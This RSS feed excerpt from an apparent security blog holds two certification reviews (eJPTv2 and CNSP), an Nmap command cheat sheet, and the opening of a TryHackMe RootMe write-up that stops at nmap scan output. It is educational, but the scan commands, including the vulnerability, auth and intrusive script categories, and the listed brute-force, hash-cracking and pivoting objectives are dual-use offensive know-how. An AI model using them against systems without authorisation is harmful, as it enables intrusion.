            <guid>https://nmmorette.github.io/posts/2023/12/review-ejptv2-junior-penetration-tester/</guid>
            <description>eJPTv2 Review Introduction This is my review of the eJPTv2 certification offered by INE. Initially, I purchased the voucher for the exam, version V1, without including the training. Later, I was able to exchange it for the V2 version with INE, a process that went smoothly and without complications or costs.
I decided not to participate in the training offered by INE, a choice based on my pre-existing experience in the field.</description>
            <content type="html"><![CDATA[<h1 id="ejptv2-review">eJPTv2 Review</h1>
<h2 id="introduction"><strong>Introduction</strong></h2>

    <img src="/images/ejptv2-review/ejpt.gif"  class="center"  style="border-radius: 10px;"  />


<p>This is my review of the eJPTv2 certification offered by INE.
Initially, I purchased the voucher for the exam, version V1, without including the training. Later, I was able to exchange it for the V2 version with INE, a process that went smoothly and without complications or costs.</p>
<p>I decided not to participate in the training offered by INE, a choice based on my pre-existing experience in the field. This experience led me to believe that I already had the necessary knowledge to take the eJPT exam without the need for additional preparation.</p>
<p>To be considered successful in the exam, it is necessary to achieve a minimum of 70% correct answers. The result is calculated and displayed on the screen immediately after submitting the answers, which provides a clear and immediate view of the performance achieved.</p>
<p>INE no longer supports the V1 version of this exam, so you can now only purchase the new version.</p>
<h3 id="price">Price</h3>
<p>Link to buy: <a href="https://checkout.ine.com/?product_selected=ejptv2_funda_quarterly" target="_blank" >https://checkout.ine.com/?product_selected=ejptv2_funda_quarterly</a></p>

    <img src="/images/ejptv2-review/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<p>INE offers a package that includes an exam voucher and three months of access to its educational platform for $249. This package is ideal for those seeking structured training along with the opportunity to get certified.</p>
<p>A valuable tip for potential candidates is to consider waiting for promotions. INE often offers discounts on exam vouchers and subscriptions, which can lead to significant savings.Based on my experience and observations of INE&rsquo;s pricing practices, I recommend that those interested in obtaining INE certifications keep an eye out for these promotional opportunities. The quality of the training material and the efficiency of the exam process make the investment worthwhile, especially if you can take advantage of these discounts.</p>

    <img src="/images/ejptv2-review/Untitled1.png"  class="center"  style="border-radius: 10px;"  />


<p>My experience with INE&rsquo;s certification included a transition in how the company offers its products. When I purchased the voucher for the eJPT v1 exam, I chose not to include the training course. This option was available on INE&rsquo;s old website, allowing the separate purchase of just the exam voucher.</p>
<p>However, it&rsquo;s important to highlight a significant change for those currently considering this certification. On INE&rsquo;s website, the option to purchase only the exam voucher without the associated training seems to no longer be available. This may represent a change in study strategy and budget for candidates, especially for those who, like me, feel confident in their pre-existing skills and prefer not to acquire additional training.</p>
<p>Therefore, for future candidates, I recommend a detailed evaluation of the options available on INE&rsquo;s current website. Additionally, as mentioned earlier, stay alert for promotions offered by INE, as they may include significant discounts on the training and voucher package.</p>
<p>For more information, contact INE support: <a href="mailto:support@ine.com" ><strong>support@ine.com</strong></a></p>

    <img src="/images/ejptv2-review/Untitled2.png"  class="center"  style="border-radius: 10px;"  />


<h4 id="who-its-for">Who It&rsquo;s For</h4>
<p>The eJPT is a certification for individuals with a basic understanding of networks, systems, and an interest in penetration testing. Anyone can attempt the certification exam; however, it is designed for:</p>
<ul>
<li>Systems Administrators***</li>
<li>IT Project Managers</li>
<li>Information Security Officers</li>
<li>Security Engineers/Analysts</li>
<li>DevOps/ Software Developers</li>
<li>Managed Service Providers (MSPs)</li>
<li>Manage Security Service Providers (MSSPs)</li>
</ul>
<p>Despite these recommendations, anyone can take the exam as there are no mandatory prerequisites. Moreover, if your knowledge of the subject is minimal, it is highly recommended that you prepare for this exam using the INE&rsquo;s Penetration Testing Learning Path.</p>

    <img src="/images/ejptv2-review/Untitled3.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="content"><strong>Content</strong></h2>
<p>The eJPT assesses and certifies an individual’s skills in Assessment Methodologies (25%), Host and Networking Auditing (25%), Host and Network Penetration Testing (35%), and Web Application Penetration Testing (15%). The following objectives are tested:</p>
<h3 id="1-assessment-methodologies">1. Assessment Methodologies</h3>
<pre><code>1. Locate endpoints on a network
2. Identify vulnerabilities in services
3. Identify operating system of a target
4. Identify open ports and services on a target
5. Extract company information from public sources
6. Gather technical information from public sources
7. Gather email addresses from public sources
8. Evaluate information and criticality or impact of vulnerabilities
</code></pre>
<h3 id="2-host--network-auditing">2. Host &amp; Network Auditing</h3>
<pre><code>1. Transfer files to and from target
2. Enumerate system information on target
3. Compile information from files on target
4. Gather user account information on target
5. Gather hash/password information from target
6. Enumerate network information from files on target
</code></pre>
<h3 id="3-host--network-penetration-testing">3. Host &amp; Network Penetration Testing</h3>
<pre><code>1. Conduct hash cracking
2. Identify and modify exploits
3. Conduct brute-force password attacks
4. Conduct exploitation with metasploit
5. Demonstrate pivoting by adding a route
6. Demonstrate pivoting by port forwarding
</code></pre>
<h3 id="4-web-application-penetration-testing">4. Web Application Penetration Testing</h3>
<pre><code>1. Conduct webapp reconnaissance
2. Conduct brute-force login attack
3. Locate hidden file and directories
4. Identify vulnerabilities in webapps
</code></pre>

    <img src="/images/ejptv2-review/Untitled4.png"  class="center"  style="border-radius: 10px;"  />


<p>The certification exam follows a Capture The Flag (CTF) style. If you are familiar with platforms like TryHackMe and Hack The Box, you&rsquo;ll have a preliminary idea of what to expect in the exam.</p>
<p>As it&rsquo;s a practical exam, candidates have 48 hours to complete it, and the responses are multiple-choice. This format gives you a certain advantage when answering.</p>
<p>Some questions will require a flag, while others will ask about open ports on hosts, vulnerable services, and questions related to exploiting the host. There&rsquo;s no need to submit a report after the exam; you just have to answer the questions and complete the test.</p>
<h2 id="how-to-study"><strong>How to Study</strong></h2>
<p>I need to divide this topic into two sections: how to study for the exam if you are a beginner, and how to study for the exam if you already work in the field of cybersecurity or have extensive experience with CTFs.</p>
<h3 id="beginner">Beginner</h3>
<p>If your knowledge in Cyber Security is very limited, I advise taking the course offered by INE itself (Penetration Testing Learning Path). They provide a comprehensive preparation for this certification, covering all the topics related to the exam. By completing the entire course and the labs, you will be prepared for this certification, as all the exam content is included in the course.</p>
<h3 id="security-professional">Security Professional</h3>
<p>If you are a professional in the field and already have knowledge in penetration testing, or are experienced in hacking machines on platforms like TryHackMe or Hack the Box, this certification will likely not present many challenges. Therefore, I believe it can be undertaken without extensive preparation, as was the case for me.</p>
<h2 id="tips"><strong>Tips</strong></h2>
<h3 id="cheat-sheet">Cheat Sheet</h3>
<p>Check out my Cheat Sheet for eJPTV2 certification: <a href="https://nmmorette.github.io/posts/2023/12/ejptv2-cheat-sheet/" target="_blank" >eJPT Cheat Sheet</a></p>
<h3 id="labs">Labs</h3>
<p>I&rsquo;m providing a list of machines that I believe can help beginners practice and allow experienced individuals to test their knowledge before attempting the exam.</p>
<blockquote>
<p>This is just my recommendation, based on my opinion and knowledge. Take your notes and prepare for the exam.</p>
</blockquote>
<h3 id="tryhackme">TryhackMe</h3>

    <img src="/images/ejptv2-review/WhoAMI.jpg"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://tryhackme.com/room/basicpentestingjt" target="_blank" >TryHackMe | Basic Pentesting</a></p>
<p><a href="https://tryhackme.com/room/ice" target="_blank" >TryHackMe | Ice</a></p>
<p><a href="https://tryhackme.com/room/brooklynninenine" target="_blank" >TryHackMe | Brooklyn Nine Nine</a></p>
<p><a href="https://tryhackme.com/room/anonymous" target="_blank" >TryHackMe | Anonymous</a></p>
<p><a href="https://tryhackme.com/room/easypeasyctf" target="_blank" >TryHackMe | Easy Peasy</a></p>
<p><a href="https://tryhackme.com/room/goldeneye" target="_blank" >TryHackMe | GoldenEye</a></p>
<p><a href="https://tryhackme.com/room/jokerctf" target="_blank" >TryHackMe | HA Joker CTF</a></p>
<p><a href="https://tryhackme.com/room/source" target="_blank" >TryHackMe | Source</a></p>
<p><a href="https://tryhackme.com/room/poster" target="_blank" >TryHackMe | Poster</a></p>
<p><a href="https://tryhackme.com/room/wordpresscve202129447" target="_blank" >TryHackMe | Wordpress: CVE-2021-29447</a></p>
<p><a href="https://tryhackme.com/room/blog" target="_blank" >TryHackMe | Blog</a></p>
<p><a href="https://tryhackme.com/room/rrootme" target="_blank" >TryHackMe | RootMe</a></p>
<h3 id="hack-the-box">Hack the Box</h3>

    <img src="/images/ejptv2-review/7.jpg"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://app.hackthebox.com/machines/3" target="_blank" >Hack The Box</a></p>
<p><a href="https://app.hackthebox.com/machines/344" target="_blank" >Hack The Box</a></p>
<p><a href="https://app.hackthebox.com/machines/114" target="_blank" >Hack The Box</a></p>
<p><a href="https://app.hackthebox.com/machines/146" target="_blank" >Hack The Box</a></p>
<p><a href="https://app.hackthebox.com/machines/2" target="_blank" >Hack The Box</a></p>
<p><a href="https://app.hackthebox.com/machines/1" target="_blank" >Hack The Box</a></p>
<h3 id="materials-from-content-creators">Materials from Content Creators</h3>
<p>There is a lot of content from cyber security professionals over the internet to help you study to eJPT.</p>
<p><a href="https://drive.google.com/file/d/1bfZH7ZluaX5nmBx1Dcof43IN0PfHwChG/view?usp=sharing" target="_blank" >https://drive.google.com/file/d/1bfZH7ZluaX5nmBx1Dcof43IN0PfHwChG/view?usp=sharing</a></p>
<p><a href="https://github.com/edoardottt/eJPT-notes" target="_blank" >https://github.com/edoardottt/eJPT-notes</a></p>
<p><a href="https://github.com/JasonTurley/eJPT/blob/main/cheat-sheet.md" target="_blank" >eJPT/cheat-sheet.md at main · JasonTurley/eJPT</a></p>
<p><a href="https://github.com/atinfosec/eJPT-Cheatsheet/blob/main/eJPT%20Cheatsheet.md" target="_blank" >eJPT-Cheatsheet/eJPT Cheatsheet.md at main · atinfosec/eJPT-Cheatsheet</a></p>
<p><a href="https://github.com/d3m0n4l3x/eJPT" target="_blank" >https://github.com/d3m0n4l3x/eJPT</a></p>
<p><a href="https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/" target="_blank" >How to Pass the eJPT</a></p>
<p><a href="https://joasantonio108.medium.com/my-journey-to-pass-ejpt-elearnsecurity-7de5cd532dd9" target="_blank" >My Journey to Pass eJPT (eLearnsecurity)</a></p>
<h2 id="steps"><strong>Steps</strong></h2>
<p><a href="https://security.ine.com/certifications/ejpt-certification/#c448a743d6ef69376" target="_blank" ><strong>1. Purchase a certification exam voucher</strong></a></p>
<p>Purchase an exam voucher to start the certification process. Login to the certification area to manage the exam and any other materials related to the certification process.</p>
<p><a href="https://security.ine.com/certifications/ejpt-certification/#129ece376f18b2a90" target="_blank" ><strong>2. Begin the certification process</strong></a></p>
<p><strong>Regular vouchers expire after 180 days from purchase.</strong> Before the certification voucher expires (180 days from purchase), complete the initial exam attempt and if desired, the complimentary re-take that is provided with the voucher’s purchase. Both attempts must be submitted before the certification voucher expires. The expiration date will always be available in the certification area, and reminder emails are sent to ensure the voucher is taken advantage of.</p>
<p><a href="https://security.ine.com/certifications/ejpt-certification/#07e104512ff2c3ba4" target="_blank" ><strong>3. Take your exam</strong></a></p>
<p>Follow the certification instructions and complete the exam within the allotted time. If technical issues are encountered at any time during the exam, please email <a href="mailto:support@ine.com" >support@ine.com</a> for assistance.</p>
<p><a href="https://security.ine.com/certifications/ejpt-certification/#4642f5a2d275206b3" target="_blank" ><strong>4. Receive your results</strong></a></p>
<p>Results are on an auto-graded system. This means results will be delivered within a few hours after completing the exam. The eJPT score report will show performance metrics in each section of the exam, allowing reflection on mastery of each exam objective. <strong>All passing score credentials will be valid for three years from the date they were awarded.</strong></p>
<h2 id="worth-it"><strong>Worth it?</strong></h2>
<p>The eJPT certification stands out as a valuable option, especially for those at the beginning of their journey in the field of cybersecurity. It diverges from the traditional question-and-answer model of other certifications by offering a practical introduction to the world of penetration testing, covering essential concepts and providing hands-on experience. With an approach that prioritizes practical learning, this certification is an excellent gateway into the field of cybersecurity, equipping candidates with the knowledge and skills necessary to take their first steps in a pentesting career.</p>
<p>If you are a professional with limited experience or no specific prior knowledge in cybersecurity, I firmly believe that the training offered for this certification is worth the effort. The training provides a solid foundation of essential knowledge and practical skills to get started in the field.</p>
<p>Moreover, I highly recommend the eJPT for professionals working in related fields, such as infrastructure and networking, who are considering a transition to cybersecurity. It serves as an effective bridge, translating and expanding the skills already acquired into the cybersecurity domain.</p>
<p>The practical approach of eJPT allows professionals to not only learn theoretically but also apply practical knowledge, thus becoming more prepared for the challenges and demands of the cybersecurity field. Therefore, for those looking to transition careers or start in the world of cybersecurity, the eJPT certification emerges as a strategic and valuable choice.</p>
<p>I personally favor practical certifications like those from INE, OffSec, and TCM Security, so if I had to recommend an entry-level certification for Information Security, I would steer away from theoretical certifications, and eJPT would definitely be on my list of recommendations.</p>

    <img src="/images/ejptv2-review/Untitled5.png"  class="center"  style="border-radius: 10px;"  />


<p>If you already have significant experience and are seeking challenges that match your level of expertise, the eJPT may seem less challenging. As an entry-level certification, it is designed to establish foundational knowledge but may not offer much advancement for those who are already well-established in the field.</p>
<p>For experienced professionals, I would recommend considering more advanced certifications like the eCPPT (Certified Professional Penetration Tester) or the PNPT (Professional Network Penetration Tester). These certifications provide a higher level of challenge and are in line with the needs of professionals looking to deepen and demonstrate advanced cybersecurity skills.</p>
<p>In summary, while the eJPT certification is an excellent starting point for beginners or professionals from related fields transitioning into cybersecurity, experienced professionals might find more value in pursuing certifications that offer more complex and in-depth challenges.</p>

    <img src="/images/ejptv2-review/Untitled6.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>The Essential Nmap Cheat Sheet for Quick Reference</title>
            <link>https://nmmorette.github.io/posts/2023/12/the-essential-nmap-cheat-sheet-for-quick-reference/</link>
            <pubDate>Tue, 05 Dec 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/12/the-essential-nmap-cheat-sheet-for-quick-reference/</guid>
            <description>The Essential Nmap Cheat Sheet for Quick Reference Introduction Nmap (Network Mapper) is an open-source tool for network exploration and security auditing. Widely used by network administrators, it&amp;rsquo;s crucial for vulnerability scanning and network inventory. This cheat sheet provides a quick reference to the most commonly used Nmap commands and options, ideal for both beginners and experienced users.
Basic Scanning Techniques  Basic Network Scan: Command: nmap [target]  Use to quickly scan a target IP or domain.</description>
            <content type="html"><![CDATA[<h1 id="the-essential-nmap-cheat-sheet-for-quick-reference">The Essential Nmap Cheat Sheet for Quick Reference</h1>

    <img src="/images/nmap.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>Nmap (Network Mapper) is an open-source tool for network exploration and security auditing. Widely used by network administrators, it&rsquo;s crucial for vulnerability scanning and network inventory. This cheat sheet provides a quick reference to the most commonly used Nmap commands and options, ideal for both beginners and experienced users.</p>
<h3 id="basic-scanning-techniques">Basic Scanning Techniques</h3>
<ol>
<li><strong>Basic Network Scan:</strong>
Command: <strong><code>nmap [target]</code></strong>
<ul>
<li>Use to quickly scan a target IP or domain.</li>
</ul>
</li>
<li><strong>Scan Multiple IPs or Subnets:</strong>
Command: <strong><code>nmap [target1, target2, etc.]</code></strong>
<ul>
<li>Handy for scanning multiple targets.</li>
</ul>
</li>
<li><strong>Ping Scan (No Port Scan):</strong>
Command: <strong><code>nmap -sn [target]</code></strong>
<ul>
<li>Useful for checking if the host is online without performing a port scan.</li>
</ul>
</li>
</ol>
<h3 id="advanced-scanning-options">Advanced Scanning Options</h3>
<ol>
<li><strong>TCP SYN Scan (Stealth Scan):</strong>
Command: <strong><code>nmap -sS [target]</code></strong>
- Less intrusive and stealthier than a connect scan.</li>
<li><strong>UDP Scan:</strong>
Command: <strong><code>nmap -sU [target]</code></strong>
- For scanning UDP ports. It&rsquo;s slower but essential for a complete security audit.</li>
<li><strong>Aggressive Scan:</strong>
Command: <strong><code>nmap -A [target]</code></strong>
- Provides a more comprehensive output including OS detection, version detection, script scanning, and traceroute.</li>
<li><strong>Version Detection:</strong>
Command: <strong><code>nmap -sV [target]</code></strong>
- Detects the service version on the open ports.</li>
</ol>
<h3 id="output-options">Output Options</h3>
<ol>
<li><strong>Saving Output in a Specific Format:</strong>
Command: <strong><code>nmap -oX [output.xml] [target]</code></strong> (for XML format)
- Other formats include <strong><code>oN</code></strong> for normal, <strong><code>oG</code></strong> for grepable, and <strong><code>oA</code></strong> for all.</li>
<li><strong>Verbose Output:</strong>
Command: <strong><code>nmap -v [target]</code></strong>
- Provides more detailed output.</li>
</ol>
<h2 id="scripts"><strong>Scripts</strong></h2>
<p>Nmap&rsquo;s scripting engine (NSE) is one of its most powerful and flexible features. It allows users to write (or use existing) scripts to automate a wide variety of networking tasks. This cheat sheet covers some of the most useful Nmap scripts for network discovery, vulnerability detection, and more.</p>
<h3 id="understanding-nmap-script-types">Understanding Nmap Script Types:</h3>
<ol>
<li><strong>Default Scripts:</strong>
- Automatically used by Nmap for common tasks.
- Example: <strong><code>nmap -sC [target]</code></strong> (Runs default scripts)</li>
<li><strong>Safe Scripts:</strong>
- Designed not to disrupt the target network.
- Example: <strong><code>nmap --script safe [target]</code></strong></li>
<li><strong>Intrusive Scripts:</strong>
- Potentially disruptive, should be used with caution.
- Example: <strong><code>nmap --script intrusive [target]</code></strong></li>
</ol>
<h3 id="popular-script-categories">Popular Script Categories</h3>
<ol>
<li><strong>Discovery:</strong></li>
</ol>
<ul>
<li>Scripts for network and service discovery.</li>
<li>Example: <strong><code>nmap --script discovery [target]</code></strong></li>
</ul>
<ol start="2">
<li><strong>Vulnerability:</strong></li>
</ol>
<ul>
<li>Identifies known vulnerabilities.</li>
<li>Example: <strong><code>nmap --script vuln [target]</code></strong></li>
</ul>
<ol start="3">
<li><strong>Authentication:</strong></li>
</ol>
<ul>
<li>Tests for authentication mechanisms and weaknesses.</li>
<li>Example: <strong><code>nmap --script auth [target]</code></strong></li>
</ul>
<ol start="4">
<li><strong>Database:</strong></li>
</ol>
<ul>
<li>Specific scripts for database servers.</li>
<li>Example: <strong><code>nmap --script &quot;database* and safe&quot; [target]</code></strong></li>
</ul>
<ol start="5">
<li><strong>Malware:</strong></li>
</ol>
<ul>
<li>Checks for signs of infection or backdoors.</li>
<li>Example: <strong><code>nmap --script malware [target]</code></strong></li>
</ul>
<h3 id="using-script-arguments">Using Script Arguments</h3>
<ul>
<li>Some scripts accept arguments for more specific control.</li>
<li>Example: <strong><code>nmap --script [script-name] --script-args=[arg]=[value] [target]</code></strong></li>
</ul>
<h3 id="combining-scripts-and-scan-techniques">Combining Scripts and Scan Techniques</h3>
<ul>
<li>Scripts can be combined with standard Nmap scan techniques.</li>
<li>Example: <strong><code>nmap -sV --script=default,vuln [target]</code></strong></li>
</ul>
<h3 id="output-and-debugging">Output and Debugging</h3>
<ul>
<li>Use verbose and debugging options for detailed script output.</li>
<li>Example: <strong><code>nmap --script [script] -d [target]</code></strong> (debugging mode)</li>
<li>Example: <strong><code>nmap --script [script] -v [target]</code></strong> (verbose mode)</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Review CNSP - Certified Network Security Practitioner</title>
            <link>https://nmmorette.github.io/posts/2023/11/review-cnsp-certified-network-security-practitioner/</link>
            <pubDate>Fri, 24 Nov 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/11/review-cnsp-certified-network-security-practitioner/</guid>
            <description>CNSP - Certified Network Security Practitioner Who Should Take This Exam? CNSP (Certified Network Security Professional) is a certification designed for a wide range of professionals in the cybersecurity field. It&amp;rsquo;s particularly suitable for security engineers, network architects, penetration testers, and members of red and blue teams. Moreover, it&amp;rsquo;s an excellent choice for any security enthusiast who aims to test and enhance their understanding of network security.
In my view, professionals with experience in networking or cybersecurity will find the exam relatively easy.</description>
            <content type="html"><![CDATA[<h1 id="cnsp---certified-network-security-practitioner">CNSP - Certified Network Security Practitioner</h1>
<h2 id="who-should-take-this-exam">Who Should Take This Exam?</h2>
<p>CNSP (Certified Network Security Professional) is a certification designed for a wide range of professionals in the cybersecurity field. It&rsquo;s particularly suitable for security engineers, network architects, penetration testers, and members of red and blue teams. Moreover, it&rsquo;s an excellent choice for any security enthusiast who aims to test and enhance their understanding of network security.</p>
<p>In my view, professionals with experience in networking or cybersecurity will find the exam relatively easy. This is because the exam covers fundamental concepts of networking and cybersecurity, which are commonly applied in the professional environment. Moreover, for students in fields related to information technology, this certification represents an excellent entry point. All the concepts covered in the exam are encompassed in IT degree courses, providing a solid and applicable foundation for those who are starting their careers in the field.</p>
<h2 id="exam-format">Exam Format</h2>
<p>The CNSP exam consists of multiple-choice questions (MCQs) that span the comprehensive syllabus. Candidates are allotted 60 minutes to complete the exam, which is proctored yet conveniently available online. This on-demand flexibility allows the exam to be taken anytime, anywhere. The questions range from factual knowledge checks to scenario-based queries, ensuring a thorough assessment of the candidate&rsquo;s abilities.</p>
<h2 id="certification-cost">Certification Cost</h2>
<p>The CNSP typically costs £250🇬🇧, but there may be discounts available.</p>

    <img src="/images/CNSP/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="passing-criteria">Passing Criteria</h2>
<p>Success in the CNSP exam is tiered:</p>
<ul>
<li>Scoring over 60% is considered a pass.</li>
<li>Achieving above 75% grants a merit distinction.</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>Targeted as an entry-level certification, CNSP focuses on core network security fundamentals. Prospective candidates should understand security misconfigurations, best practices, defense-in-depth strategies, and basic knowledge of vulnerability exploitation. Professional penetration testing experience, however, is not a prerequisite.</p>
<h2 id="exam-retake-policy">Exam Retake Policy</h2>
<p>Candidates who do not pass must purchase a new voucher for a retake.</p>
<h2 id="career-advantages">Career Advantages</h2>
<p>Earning the CNSP certification demonstrates a solid foundation in network security, paving the way for career advancement and recognition in the field.</p>
<h2 id="exam-syllabus-overview">Exam Syllabus Overview</h2>
<p>Studying for the CNSP exam requires a good mix of resources that cover each topic in the syllabus. Here are some website suggestions for each topic to help you prepare effectively:</p>
<ol>
<li><strong>TCP/IP, OSI Layer, IPv4, and IPv6</strong>
<ul>
<li><a href="https://www.netacad.com/" target="_blank" ><strong>Cisco Networking Academy</strong></a>: Offers courses and resources on networking basics, including TCP/IP and OSI models.</li>
<li><a href="https://www.ipv6.com/" target="_blank" ><strong>IPv6.com</strong></a>: Dedicated to IPv6 education, offering articles and tutorials.</li>
</ul>
</li>
<li><strong>Networking Hardware (Routers, Switches, Hubs)</strong>
<ul>
<li><a href="https://networklessons.com/" target="_blank" ><strong>NetworkLessons.com</strong></a>: Provides easy-to-understand lessons on networking hardware and concepts.</li>
<li><a href="https://www.practicalnetworking.net/" target="_blank" ><strong>Practical Networking</strong></a>: Offers tutorials focused on practical aspects of networking devices.</li>
</ul>
</li>
<li><strong>Network Discovery and Mapping Protocols</strong>
<ul>
<li><a href="https://www.wiresharktraining.com/" target="_blank" ><strong>Wireshark University</strong></a>: Learn about network protocol analysis and how to use Wireshark for network discovery.</li>
</ul>
</li>
<li><strong>Network Architectures and Target Identification</strong>
<ul>
<li><a href="https://www.computernetworkingnotes.com/" target="_blank" ><strong>ComputerNetworkingNotes</strong></a>: Covers various network architecture models and concepts.</li>
</ul>
</li>
<li><strong>Network Scanning and Fingerprinting</strong>
<ul>
<li><a href="https://nmap.org/" target="_blank" ><strong>Nmap.org</strong></a>: The official site for Nmap, a tool for network scanning and security auditing.</li>
</ul>
</li>
<li><strong>Cryptography</strong>
<ul>
<li><a href="https://www.crypto101.io/" target="_blank" ><strong>Crypto101.io</strong></a>: A free introductory book on cryptography.</li>
<li><a href="http://www.crypto-textbook.com/" target="_blank" ><strong>Cryptography and Network Security</strong></a>: Textbook site with additional resources and lectures.</li>
</ul>
</li>
<li><strong>Active Directory, Linux, and Windows Security Basics</strong>
<ul>
<li><a href="https://docs.microsoft.com/en-us/learn/" target="_blank" ><strong>Microsoft Learn</strong></a>: Offers courses on Windows and Active Directory security.</li>
<li><a href="https://www.linuxtopia.org/online_books/linux_beginner_books/linux_security/index.html" target="_blank" ><strong>Linux Security for Beginners</strong></a>: A guide for Linux security basics.</li>
</ul>
</li>
<li><strong>Vulnerabilities in Windows Services</strong>
<ul>
<li><a href="https://cve.mitre.org/" target="_blank" ><strong>CVE Mitre</strong></a>: Database of publicly known cybersecurity vulnerabilities, including those affecting Windows services.</li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank" >HackTricks - Windows Privilege Escalation</a>:  Checklist with local Windows privesc</li>
</ul>
</li>
<li><strong>Testing Web Servers and Frameworks</strong>
<ul>
<li><a href="https://www.owasp.org/" target="_blank" ><strong>OWASP</strong></a>: Resources and guidelines for secure web application development and testing.</li>
</ul>
</li>
<li><strong>Basic Malware Analysis and Social Engineering</strong>
<ul>
<li><a href="http://fumalwareanalysis.blogspot.com/p/malware-analysis-tutorials-reverse.html" target="_blank" ><strong>Malware Analysis Tutorials</strong></a>: A blog with tutorials on malware analysis.</li>
<li><a href="https://www.social-engineer.org/" target="_blank" ><strong>Social-Engineer.org</strong></a>: Information and resources on the art of social engineering.</li>
</ul>
</li>
<li><strong>Network Security Tools and Frameworks (Nmap, Wireshark, etc.)</strong>
<ul>
<li><a href="https://nmap.org/" target="_blank" ><strong>Nmap.org</strong></a>: As mentioned earlier, for Nmap.</li>
<li><a href="https://www.wiresharktraining.com/" target="_blank" ><strong>Wireshark University</strong></a>: For Wireshark tutorials.</li>
</ul>
</li>
<li><strong>Open-Source Intelligence Gathering (OSINT)</strong>
<ul>
<li><a href="https://osintframework.com/" target="_blank" ><strong>OSINT Framework</strong></a>: A framework focused on gathering information from free tools or resources.</li>
</ul>
</li>
<li><strong>Database and TLS Security Basics</strong>
<ul>
<li><a href="https://sqlzoo.net/" target="_blank" ><strong>SQLZoo</strong></a>: Interactive SQL tutorials, good for understanding database basics.</li>
<li><a href="https://letsencrypt.org/docs/" target="_blank" ><strong>Let&rsquo;s Encrypt</strong></a>: Information on TLS/SSL and how it secures websites.</li>
</ul>
</li>
<li><strong>Password Storage</strong>
<ul>
<li><a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Password_Storage_Cheat_Sheet.html" target="_blank" ><strong>OWASP Password Storage Cheat Sheet</strong></a>: Best practices for password storage.</li>
</ul>
</li>
</ol>
<p>Remember, while these resources are a great starting point, the key to success in any exam is a well-rounded study plan that includes a variety of learning materials, such as books, video tutorials, practice exams, and hands-on labs. Good luck with your preparation!</p>
<p>In conclusion, the CNSP certification offers a robust platform for professionals to validate and enhance their network security skills. Its comprehensive syllabus, combined with the convenience of online testing, makes it an attractive option for those starting their journey in cybersecurity and seasoned practitioners looking to formalize their expertise.</p>
<h1 id="mock-exam">Mock Exam</h1>
<p>The SecOps Group offers free mock exams on their website, allowing you to test your machine&rsquo;s environment before taking the actual exam, as well as providing some sample questions.</p>

    <img src="/images/CNSP/Untitled1.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/CNSP/Untitled2.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/CNSP/Untitled3.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/CNSP/Untitled4.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/CNSP/Untitled5.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - Rootme - Write-Up</title>
            <link>https://nmmorette.github.io/posts/2023/11/tryhackme-rootme-write-up/</link>
            <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2023/11/tryhackme-rootme-write-up/</guid>
            <description>RootMe Enumeration nmap Initial enumeration with nmap
nmap 10.10.88.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-21 05:03 PST Nmap scan report for 10.10.88.1 Host is up (0.32s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE 1/tcp filtered tcpmux 22/tcp open ssh 80/tcp open http 2200/tcp filtered ici Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds After conducting the initial enumeration using Nmap, I discovered two open ports: port 22, typically used for Secure Shell (SSH) connections, and port 80, which is the default port for HTTP traffic.</description>
            <content type="html"><![CDATA[<h1 id="rootme">RootMe</h1>

    <img src="/images/rootme/image.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<p>Initial enumeration with nmap</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">nmap</span> <span style="color:#ae81ff">10.10.88.1</span>    
<span style="color:#a6e22e">Starting</span> <span style="color:#a6e22e">Nmap</span> <span style="color:#ae81ff">7.94</span><span style="color:#a6e22e">SVN</span> ( <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//nmap.org ) at 2023-11-21 05:03 PST
</span><span style="color:#75715e"></span><span style="color:#a6e22e">Nmap</span> <span style="color:#a6e22e">scan</span> <span style="color:#a6e22e">report</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.88.1</span>
<span style="color:#a6e22e">Host</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.32</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">latency</span>).
<span style="color:#a6e22e">Not</span> <span style="color:#a6e22e">shown</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">996</span> <span style="color:#a6e22e">closed</span> <span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">ports</span> (<span style="color:#a6e22e">conn</span><span style="color:#f92672">-</span><span style="color:#a6e22e">refused</span>)
<span style="color:#a6e22e">PORT</span>     <span style="color:#a6e22e">STATE</span>    <span style="color:#a6e22e">SERVICE</span>
<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>    <span style="color:#a6e22e">filtered</span> <span style="color:#a6e22e">tcpmux</span>
